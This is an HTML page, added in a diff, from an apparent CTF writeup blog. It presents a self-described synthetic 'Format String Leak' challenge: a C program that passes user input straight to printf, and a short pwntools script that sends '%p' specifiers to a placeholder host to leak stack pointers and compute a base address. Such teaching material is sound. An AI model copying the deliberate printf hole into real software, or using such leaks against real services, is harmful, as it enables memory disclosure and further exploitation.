@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Misc: Format String Leak | Ocean Writeups</title>
+    <meta name="description" content="Quick leak-and-parse workflow for a format string challenge." />
+    <link rel="stylesheet" href="/assets/styles.css" />
+    <link rel="stylesheet" href="/assets/prism.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"
+    />
+  </head>
+  <body>
+    <div class="page-bg"></div>
+    <header class="site-header" aria-hidden="true"></header>
+    <main class="container">
+      <article class="post glass">
+  <a href="/#writeups" class="back-link">
+    <svg viewBox="0 0 24 24" aria-hidden="true">
+      <path
+        d="M15 6l-6 6 6 6"
+        fill="none"
+        stroke="currentColor"
+        stroke-width="1.5"
+        stroke-linecap="round"
+        stroke-linejoin="round"
+      />
+    </svg>
+    Back to writeups
+  </a>
+  <header class="post-header">
+    <p class="eyebrow">Writeup</p>
+    <h1>Misc: Format String Leak</h1>
+    <div class="post-meta">
+      <span>Jul 10, 2024</span>
+      
+      <span class="meta-pill">Misc</span>
+      
+      
+      <span class="meta-pill">Easy</span>
+      
+      
+      <div class="tag-row">
+        
+        <span class="meta-pill">HTB</span>
+        
+      </div>
+      
+    </div>
+  </header>
+  <div class="post-content prose">
+    <p>A short, synthetic writeup to showcase syntax highlighting for C and Python.</p>
+<h2>Vulnerable snippet ©</h2>
+<pre class="language-c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter your name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">fgets</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    name<span class="token punctuation">[</span><span class="token function">strcspn</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/* Vulnerable: user-controlled format string */</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<h2>Quick exploit (Python)</h2>
+<pre class="language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> remote
+
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"example.ctf"</span><span class="token punctuation">,</span> <span class="token number">31337</span><span class="token punctuation">)</span>
+
+<span class="token comment"># Leak stack values; grab a pointer-like value for a base calc.</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"%p %p %p %p %p %p"</span><span class="token punctuation">)</span>
+leak <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leaks:"</span><span class="token punctuation">,</span> leak<span class="token punctuation">)</span>
+
+<span class="token comment"># Example parse: take the 5th leak and compute a fake base.</span>
+ptr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>leak<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+base <span class="token operator">=</span> ptr <span class="token operator">-</span> <span class="token number">0x1234</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"base:"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+
+  </div>
+</article>
+
+    </main>
+  </body>
+</html>
